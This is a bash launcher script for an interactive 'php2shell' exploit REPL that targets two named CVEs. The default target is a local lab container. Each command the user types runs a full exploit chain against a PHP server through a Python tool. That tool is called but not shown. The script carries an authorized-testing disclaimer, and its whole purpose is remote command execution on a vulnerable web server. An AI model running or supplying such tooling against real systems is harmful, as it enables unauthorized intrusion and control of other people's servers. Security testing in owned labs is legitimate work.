#!/usr/bin/env bash
# php2shell interactive REPL — CVE-2026-109618 / CVE-2026-109619
# Runs a full exploit chain per command entered.
# Authorized testing only. Run against systems you own or have written permission to test.
set -euo pipefail

SCRIPTS_DIR="$(cd "$(dirname "$0")" && pwd)"
PHP2SHELL="$SCRIPTS_DIR/../toolkit"

if [ ! -d "$PHP2SHELL" ]; then
  echo "[-] Toolkit not found at $PHP2SHELL — run ./setup.sh first"
  exit 1
fi

cd "$PHP2SHELL"

TARGET="${1:-http://127.0.0.1:8106/index.php}"
CONTAINER="${2:-p2s-lab-8511}"

echo "========================================================"
echo " PHP2Shell Interactive REPL"
echo " Target    : $TARGET"
echo " Container : $CONTAINER"
echo " Each command runs a full exploit chain."
echo " Ctrl+C to exit."
echo "========================================================"
echo ""

python3 tools/php2shell_auto.py \
  -u "$TARGET" \
  --container "$CONTAINER" \
  --repo-dir vendor/php2shell-upstream \
  --interactive
